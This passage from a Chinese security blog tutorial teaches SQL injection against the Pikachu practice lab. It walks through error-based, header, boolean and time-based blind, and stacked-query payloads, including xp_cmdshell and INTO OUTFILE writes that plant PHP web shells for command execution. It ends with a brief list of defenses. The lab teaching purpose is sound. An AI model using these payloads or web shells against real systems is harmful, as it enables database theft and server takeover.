+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="string">&#x27; or updatexml(1,concat(0x7e,(select database())),0) or &#x27;</span></span><br><span class="line"><span class="comment">-- 使用 &#x27; 构造闭合的同时 or 可以使updatexml执行</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将payload注入得到数据库名</p>
+<p>​                                                                                      <img src="https://s2.loli.net/2023/12/24/AM4WIdXv2YaxVsc.png" alt="image-20231224003051327"></p>
+</li>
+</ul>
+</li>
+<li><p><strong>delete下使用updatexml()报错函数得到信息</strong></p>
+<p><img src="https://s2.loli.net/2023/12/24/OkPibjqMUN8GVnW.png" alt="image-20231224003705493"></p>
+<ul>
+<li><p>打开Burp Suite请求拦截,点击留言列表下的删除,Burp Suite拦截到的数据包如下</p>
+<p><img src="https://s2.loli.net/2023/12/24/96yNijzFAKmsfSl.png" alt="image-20231224004136736"></p>
+</li>
+<li><p>观察数据包可知,delete操作是通过数值型的id进行删除的,可以猜测后端操作形如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> message <span class="keyword">where</span> id<span class="operator">=</span>&#123;_GET[<span class="string">&#x27;id&#x27;</span>]&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造payload,并进行url编码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())),<span class="number">0</span>)</span><br><span class="line"><span class="comment">-- url编码</span></span><br><span class="line"><span class="number">1</span><span class="operator">+</span><span class="keyword">or</span><span class="operator">+</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span><span class="operator">+</span>database())),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>替换id后提交请求</p>
+<p><img src="https://s2.loli.net/2023/12/24/bY2ZRNeq7xE1slv.png" alt="image-20231224005217876"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="3-http-header注入"><a href="#3-http-header注入" class="headerlink" title="3.http header注入"></a>3.http header注入</h5><ul>
+<li><p>有些时候，后台开发人员为了验证客户端头信息(比如常用的cookie验证)或者通过http headers头信息获取客户端的一些信息，</p>
+<p>比如useragent、accept字段等等会对客户端的http headerf信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑</p>
+<p>则可能会导致基于http header的SQL Injecti漏洞。</p>
+<img src="https://s2.loli.net/2023/12/24/G7RVAtO6LJKrHvs.png" alt="image-20231224220251679" style="zoom:80%;" />
+
+
+</li>
+<li><p>通过BurpSuite抓包</p>
+<img src="https://s2.loli.net/2023/12/24/eldWapJftHNIQ5z.png" alt="image-20231224220717423" style="zoom: 80%;" />
+
+
+</li>
+<li><p>将User-Agent改为单引号,重新提交请求,相应包中有sql语法报错,可以判断有sql注入漏洞</p>
+<img src="https://s2.loli.net/2023/12/24/7ar5xC4z8gdYf6h.png" alt="image-20231224221852752" style="zoom:92%;" />
+
+
+</li>
+<li><p>构建payload，进行sql注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;or updatexml(1,concat(0x7e,database()),0)or &#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/12/24/fE6MgcsNnxI4PU1.png" alt="image-20231224222730860"></p>
+</li>
+</ul>
+<h4 id="四-SQL-Injecti漏洞-盲注"><a href="#四-SQL-Injecti漏洞-盲注" class="headerlink" title="四. SQL Injecti漏洞-盲注"></a>四. SQL Injecti漏洞-盲注</h4><h5 id="1-boolian-base原理及测试"><a href="#1-boolian-base原理及测试" class="headerlink" title="1.boolian base原理及测试"></a>1.boolian base原理及测试</h5><ul>
+<li><strong>原理</strong>：<ul>
+<li>攻击者通过构造SQL语句，向数据库发送一系列的布尔查询（True或False）。</li>
+<li>通过观察应用的响应，攻击者可以推断查询的结果是否为真或假，从而逐步猜测数据库中的数据。</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://s2.loli.net/2024/01/01/RWKd43XPjVUgLok.png" alt="image-20240101211234934"></p>
+<ul>
+<li><p>输入单引号,发现不会报错</p>
+<p><img src="https://s2.loli.net/2024/01/01/aihfeFjIBr5Qom6.png" alt="image-20240101211456571"></p>
+</li>
+<li><p>输入已知name:kobe,查询数据</p>
+<p><img src="https://s2.loli.net/2024/01/01/xBUvwAQFYretuc5.png" alt="image-20240101211541853"></p>
+</li>
+<li><p>构建payload,判断是否存在sql注入漏洞</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and 1=1#</span></span><br><span class="line"><span class="string">kobe&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>#</span><br><span class="line"><span class="comment">-- 如果kobe&#x27; and 1=1#为真,而kobe&#x27; and 1=2#为假,即可判断存在sql注入漏洞</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/01/01/GJ4gyERfXCvMDq9.png" alt="image-20240101211921082"></p>
+<p><img src="https://s2.loli.net/2024/01/01/42YQyCITHBSzl9u.png" alt="image-20240101211939847"></p>
+</li>
+<li><p>以得到数据库名为目的构建payload,先获得数据库名长度为7</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and length(database())=7;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 通过对查询结果的情况逐步改变判断条件可以得出长度</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://s2.loli.net/2024/01/01/YOJXV4Dk9vyFUMh.png" alt="image-20240101215012215"></p>
+<ul>
+<li><p>构建payload,先获得数据库name的第一个字母为p，后续可通过手工或sqlmap或脚本得到完全数据库name</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;and ascii(substr(database(),1,1))=112;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 通过对查询结果的情况逐步改变判断条件可以得出字母</span></span><br><span class="line"><span class="string">-- substr可以获得database()的第1个字符</span></span><br><span class="line"><span class="string">-- ascii可以获得字符的ascii</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/01/01/EnsTJ2Cp8QbLt6Y.png" alt="image-20240101215029466"></p>
+</li>
+</ul>
+<h5 id="2-time-base原理及测试"><a href="#2-time-base原理及测试" class="headerlink" title="2.time base原理及测试"></a>2.time base原理及测试</h5><ul>
+<li><p><strong>原理</strong>：</p>
+<ul>
+<li><p>攻击者通过构造SQL语句，向数据库发送一系列的延时查询，通过观察应用的响应时间来判断查询是否成功。</p>
+</li>
+<li><p>常见的是使用<code>SLEEP()</code>函数来引起延时。</p>
+<p><img src="https://s2.loli.net/2024/01/01/DeCRsa9TYSw8ybl.png" alt="image-20240101215738582"></p>
+</li>
+</ul>
+</li>
+<li><p>time base只有同一种回显，可以通过浏览器网络部分中的时间线判断构建的payload的sql部分是否执行</p>
+<p><img src="https://s2.loli.net/2024/01/01/96iucEpf8FNar7B.png" alt="image-20240101220153435"></p>
+</li>
+<li><p>构建payload,先获得数据库name的第一个字母为p，后续可通过手工或sqlmap或脚本得到完全数据库name</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;and if((substr(database(),1,1))=&#x27;</span>p<span class="string">&#x27;,sleep(5),null)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 如果substr(database(),1,1))=&#x27;</span>p<span class="string">&#x27;，就停止5000ms</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<img src="https://s2.loli.net/2024/01/01/hcndJDma5TsiGS3.png" alt="image-20240101221105792"  />
+
+
+
+<h4 id="五-堆叠注入"><a href="#五-堆叠注入" class="headerlink" title="五. 堆叠注入"></a>五. 堆叠注入</h4><h5 id="1-Mysql"><a href="#1-Mysql" class="headerlink" title="1.Mysql"></a>1.Mysql</h5><p>（1）新建一表 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015645671-1445708848.gif" alt="img"></p>
+<p>执行成功，我们再去看一下是否新建成功表。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015645943-40278598.gif" alt="img"></p>
+<p>（2）删除上面新建的test表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015646198-1529755622.gif" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015646449-976012187.gif" alt="img"></p>
+<p>（3）查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015646651-307633841.gif" alt="img"></p>
+<p>（4）加载文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;select load_file(&#x27;c:/tmpupbbn.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015646928-818625825.gif" alt="img"></p>
+<p>(4) 修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;insert into users(id,username,password) values (&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015647123-855312514.gif" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015647385-1686789783.gif" alt="img"></p>
+<h5 id="2-Sql-server"><a href="#2-Sql-server" class="headerlink" title="2. Sql server"></a>2. Sql server</h5><p>(1)增加数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;create table sc3(ss CHAR(8));</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015647694-982429887.gif" alt="img"></p>
+<p>(2) 删除数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;drop table sc3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015648051-1234311462.gif" alt="img"></p>
+<p>(4)查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3;select * from test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015648347-1625714699.gif" alt="img"></p>
+<p>(5)修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;update test set name=&#x27;test&#x27; where id=3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015648636-932399825.gif" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015648911-1380875302.gif" alt="img"></p>
+<p>(5)sqlserver中最为重要的存储过程的执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1;exec master..xp_cmdshell &#x27;ipconfig&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015649295-413295225.gif" alt="img"></p>
+<h5 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3.Oracle"></a>3.Oracle</h5><p>上面的介绍中我们已经提及，oracle不能使用堆叠注入，可以从图中看到，当有两条语句在同一行时，直接报错。无效字符。后面的就不往下继续尝试了。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015649555-1984392073.gif" alt="img"></p>
+<h5 id="4-Postgresql"><a href="#4-Postgresql" class="headerlink" title="4.Postgresql"></a>4.Postgresql</h5><p>(1)新建一个表 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;create table user_data(id DATE);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015649893-911848487.gif" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015650150-1255028615.gif" alt="img"></p>
+<p>可以看到user_data表已经建好。</p>
+<p>(2)删除上面新建的user_data表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;delete from user_data;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015650516-1080177008.gif" alt="img"></p>
+<p>(3)查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;select 1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015650885-769688906.gif" alt="img"></p>
+<p>(4) 修改数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user_test;update user_test set name=&#x27;modify&#x27; where name=&#x27;张三&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2018.cnblogs.com/blog/1049983/201809/1049983-20180929015651359-2117725775.gif" alt="img"></p>
+<h4 id="六-通过sqli进行服务器的远程控制"><a href="#六-通过sqli进行服务器的远程控制" class="headerlink" title="六. 通过sqli进行服务器的远程控制"></a>六. 通过sqli进行服务器的远程控制</h4><ul>
+<li><p>通过SQL Injecti漏洞写入恶意代码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">into</span> outfile &quot;/var/www/html/1.txt&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- into outfile将select的结果写入到指定目录的1.txt中</span></span><br><span class="line"><span class="comment">-- 在一些没有回显的注入中可以使用into outfile将结果写入到指定文件，然后访问获取</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>前提条件：<br>1需要知道远程目隶<br>2需要远程目录有写权限<br>3.需要数据库开启了secure_.file_priv</p>
+</li>
+</ul>
+<h5 id="1-使用sqli执行程序"><a href="#1-使用sqli执行程序" class="headerlink" title="1.使用sqli执行程序"></a>1.使用sqli执行程序</h5><ul>
+<li><p>构建将程序写入后端目录下的payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;union select &quot;&lt;?php @eval($_GET[&#x27;</span>test<span class="string">&#x27;])?&gt;&quot;,2 into outfile &quot;/var/www/html/1.php&quot;#</span></span><br><span class="line"><span class="string">-- into outfile会将select结果写入到1.php</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过get方式输入需要执行的程序</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.15</span><span class="operator">/</span><span class="number">1.</span>php?test<span class="operator">=</span>phpinfo();</span><br></pre></td></tr></table></figure>
+
+<img src="https://s2.loli.net/2024/01/02/QAuHsCF42dYKify.png" alt="image-20240102013526256" style="zoom: 80%;" /></li>
+</ul>
+<h5 id="2-使用sqli执行命令"><a href="#2-使用sqli执行命令" class="headerlink" title="2.使用sqli执行命令"></a>2.使用sqli执行命令</h5><ul>
+<li><p>构建将程序写入后端目录下的payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27;union select &quot;&lt;?php system($_GET[&#x27;</span>cmd<span class="string">&#x27;])?&gt;&quot;,2 into outfile &quot;/var/www/html/2.php&quot;#</span></span><br><span class="line"><span class="string">-- into outfile会将select结果写入到1.php</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过get方式输入需要执行的程序</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.1</span><span class="number">.15</span><span class="operator">/</span><span class="number">2.</span>php?cmd<span class="operator">=</span>ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/01/02/9dZvHFmOK4ouzsk.png" alt="image-20240102013653520"></p>
+</li>
+</ul>
+<h4 id="七-暴力破解在sqli中的应用"><a href="#七-暴力破解在sqli中的应用" class="headerlink" title="七. 暴力破解在sqli中的应用"></a>七. 暴力破解在sqli中的应用</h4><ul>
+<li><p>使用Pikachu的字符型注入为例,构建注入payload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kobe<span class="string">&#x27; and exists(select * from test);#</span></span><br><span class="line"><span class="string">-- 首先执行一次外部查询，并缓存结果集，如 SELECT * FROM A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 然后遍历外部查询结果集的每一行记录R，代入子查询中作为条件进行查询，如 SELECT 1 FROM B WHERE B.id = A.id</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 如果子查询有返回结果，则EXISTS子句返回TRUE，这一行R可作为外部查询的结果行，否则不能作为结果</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用burp suite抓包进行爆破,test作为payload</p>
+<p><img src="https://s2.loli.net/2024/01/04/7jiG6CXcnHQwvqB.png" alt="image-20240104002937715"></p>
+</li>
+</ul>
+<h4 id="八-sqli常见防范措施"><a href="#八-sqli常见防范措施" class="headerlink" title="八. sqli常见防范措施"></a>八. sqli常见防范措施</h4><p>一些常见的防范措施：</p>
+<ol>
+<li>对输入进行严格转义和过滤。</li>
+<li>使用预处理和参数化语句。</li>
+<li>限制应用程序用户的权限。</li>
+<li>更新和修补应用程序和数据库，以保护它们免受网络漏洞的影响。</li>
+<li>部署Web应用程序防火墙（WAF）以识别和仅接受给定字段的允许输入。</li>
+<li>对用户输入进行身份验证，以过滤恶意制作的外部输入。</li>
+<li>实时监控关键数据库和Web服务器。</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://RuiJiLuo.github.io">Rui Ji</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://ruijiluo.github.io/2023/12/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">http://ruijiluo.github.io/2023/12/22/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://RuiJiLuo.github.io" target="_blank">RJ の 博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2024/03/01/oVUWrJSki5dLEeX.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/02/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" title="RCE远程命令和代码执行"><img class="cover" src="https://s2.loli.net/2024/03/02/7L3OjbslwGUdPQ9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">RCE远程命令和代码执行</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" title="XSS跨站脚本"><img class="cover" src="https://s2.loli.net/2023/12/20/4dJUfz6p5ygLsZu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS跨站脚本</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rui Ji</div><div class="author-info__description">私 の hacker 夢</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ruijiluo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%EF%BC%8ESQL-Inject%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">一．SQL Inject漏洞概述</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%EF%BC%8E%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-text">1．原理概述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2%EF%BC%8E%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%82%B9%E7%B1%BB%E5%9E%8B"><span class="toc-text">2．常见注入点类型</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8E%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%82%B9%E6%BC%94%E7%A4%BA-%E5%9F%BA%E4%BA%8Epikachu"><span class="toc-text">二．常见注入点演示(基于pikachu)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%EF%BC%91-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-post"><span class="toc-text">１.数字型注入(post)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-get"><span class="toc-text">2.字符型注入(get)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">3.搜索型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">4.xx型注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89-SQL-Injecti%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95"><span class="toc-text">三. SQL Injecti漏洞手工测试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%9F%BA%E4%BA%8Eunion%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96-%E4%BB%A5%E6%95%B0%E5%AD%97%E5%9E%8B%E4%B8%BA%E4%BE%8B"><span class="toc-text">1.基于union联合查询的信息获取(以数字型为例)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%9F%BA%E4%BA%8E%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99%E7%9A%84%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9D%A5%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-text">2.基于函数报错的的方式来进行利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-http-header%E6%B3%A8%E5%85%A5"><span class="toc-text">3.http header注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B-SQL-Injecti%E6%BC%8F%E6%B4%9E-%E7%9B%B2%E6%B3%A8"><span class="toc-text">四. SQL Injecti漏洞-盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-boolian-base%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%8B%E8%AF%95"><span class="toc-text">1.boolian base原理及测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-time-base%E5%8E%9F%E7%90%86%E5%8F%8A%E6%B5%8B%E8%AF%95"><span class="toc-text">2.time base原理及测试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">五. 堆叠注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Mysql"><span class="toc-text">1.Mysql</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Sql-server"><span class="toc-text">2. Sql server</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Oracle"><span class="toc-text">3.Oracle</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-Postgresql"><span class="toc-text">4.Postgresql</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD-%E9%80%9A%E8%BF%87sqli%E8%BF%9B%E8%A1%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-text">六. 通过sqli进行服务器的远程控制</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8sqli%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-text">1.使用sqli执行程序</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8sqli%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">2.使用sqli执行命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%83-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9C%A8sqli%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-text">七. 暴力破解在sqli中的应用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AB-sqli%E5%B8%B8%E8%A7%81%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-text">八. sqli常见防范措施</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/14/pwn/" title="pwn"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn"/></a><div class="content"><a class="title" href="/2024/11/14/pwn/" title="pwn">pwn</a><time datetime="2024-11-14T09:15:12.000Z" title="发表于 2024-11-14 17:15:12">2024-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/12/app%E6%B8%97%E9%80%8F/" title="app渗透"><img src="https://s2.loli.net/2024/03/07/Dxc6Z5vWzdCfQIP.jpg" 